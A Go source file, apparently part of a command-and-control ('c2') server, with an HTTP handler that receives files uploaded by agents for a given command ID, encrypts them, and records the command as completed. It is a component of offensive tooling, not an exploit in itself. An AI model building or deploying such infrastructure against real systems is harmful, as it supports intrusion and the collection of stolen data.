package agent

import (
	"c2/database"
	"c2/utils"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

func UploadResult(w http.ResponseWriter, r *http.Request) {
	// Parse multipart
	err := r.ParseMultipartForm(10 << 20) // max 10MB
	if err != nil {
		utils.LogError("Failed to parse multipart form: " + err.Error())
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	commandID := r.FormValue("command_id")
	if commandID == "" {
		utils.LogError("Missing command_id")
		http.Error(w, "command_id is required", http.StatusBadRequest)
		return
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		utils.LogError("File not found in form: " + err.Error())
		http.Error(w, "No file provided", http.StatusBadRequest)
		return
	}
	defer file.Close()

	// Buat nama file unik
	timestamp := time.Now().Unix()
	randomSuffix := make([]byte, 4)
	rand.Read(randomSuffix)
	filename := fmt.Sprintf("%s_%d_%s%s", commandID, timestamp, hex.EncodeToString(randomSuffix), filepath.Ext(handler.Filename))
	savePath := filepath.Join("uploads", filename)

	// Simpan file sementara
	tempFile, err := os.Create(savePath)
	if err != nil {
		utils.LogError("Failed to create temp file: " + err.Error())
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer tempFile.Close()

	_, err = io.Copy(tempFile, file)
	if err != nil {
		utils.LogError("Failed to write file: " + err.Error())
		http.Error(w, "File write error", http.StatusInternalServerError)
		return
	}

	// 🔐 Baca isi file untuk dienkripsi
	fileBytes, err := os.ReadFile(savePath)
	if err != nil {
		utils.LogError("Failed to read file before encryption: " + err.Error())
		http.Error(w, "Read error", http.StatusInternalServerError)
		return
	}

	// 🔐 Enkripsi file
	encryptedData, nonce, err := utils.EncryptFile(fileBytes)
	if err != nil {
		utils.LogError("Failed to encrypt file: " + err.Error())
		http.Error(w, "Encryption failed", http.StatusInternalServerError)
		return
	}

	// Simpan file terenkripsi
	encryptedFilename := "enc_" + filename
	encryptedPath := filepath.Join("uploads", encryptedFilename)
	err = os.WriteFile(encryptedPath, encryptedData, 0644)
	if err != nil {
		utils.LogError("Failed to write encrypted file: " + err.Error())
		http.Error(w, "Write error", http.StatusInternalServerError)
		return
	}

	// Optional: Simpan nonce sebagai file samping
	noncePath := encryptedPath + ".nonce"
	err = os.WriteFile(noncePath, nonce, 0644)
	if err != nil {
		utils.LogWarning("Failed to save nonce, decryption may not be possible later")
	}

	// Hapus file original
	os.Remove(savePath)

	// Update database
	db := database.Connect()
	defer db.Close()

	_, err = db.Exec(`UPDATE commands SET result = ?, status = 'completed', executed_at = ? WHERE id = ?`,
		encryptedFilename, time.Now(), commandID)
	if err != nil {
		utils.LogError("Failed to update command result: " + err.Error())
		http.Error(w, "Database update failed", http.StatusInternalServerError)
		return
	}

	utils.LogInfo("File uploaded and encrypted for command: " + commandID)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(fmt.Sprintf(`{"status":"ok", "command_id": "%s"}`, commandID)))
}
